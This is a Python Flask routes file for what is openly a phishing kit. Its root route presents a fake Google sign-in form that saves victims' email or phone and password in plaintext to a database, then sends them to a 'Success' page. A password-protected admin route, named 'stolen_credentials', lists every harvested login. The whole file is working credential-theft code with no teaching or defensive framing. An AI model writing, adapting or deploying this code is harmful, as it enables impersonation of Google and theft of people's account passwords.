from flask import render_template, redirect, Blueprint, url_for, flash, request
from flask_login import current_user, login_user, logout_user, login_required
from werkzeug.urls import url_parse

from . import db
from .forms import GoogleLoginForm, LoginForm
from .models import User, GoogleLogin

router = Blueprint(
    'router', __name__,
    template_folder='templates',
    static_folder='static'
)


@router.route('/credentials')
@login_required
def stolen_credentials():
    credentials = GoogleLogin.query.all()
    return render_template('credentials.html', title='Credentials', credentials=credentials)


@router.route('/admin', methods=['GET', 'POST'])
def admin_login():
    if current_user.is_authenticated:
        return redirect(url_for('router.stolen_credentials'))

    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()

        if user is None or not user.check_password(form.password.data):
            flash('Invalid username or password')
            return redirect(url_for('router.admin_login'))

        login_user(user)
        next_page = request.args.get('next')
        if next_page is None or url_parse(next_page).netloc != '':
            next_page = url_for('router.stolen_credentials')

        return redirect(next_page)
    return render_template('login.html', title='Admin', form=form)


@router.route('/logout')
def admin_logout():
    logout_user()
    return redirect(url_for('router.fake_google_login'))


@router.route('/landing')
def landing():
    return render_template('landing.html', title='Success')


@router.route('/', methods=['GET', 'POST'])
def fake_google_login():
    if current_user.is_authenticated:
        return redirect(url_for('router.stolen_credentials'))

    form = GoogleLoginForm()
    if form.validate_on_submit():
        google_login = GoogleLogin(email_or_phone=form.username.data, password=form.password.data)
        db.session.add(google_login)
        db.session.commit()
        return redirect(url_for('router.landing'))
    return render_template('index.html', title='Sign In', form=form)
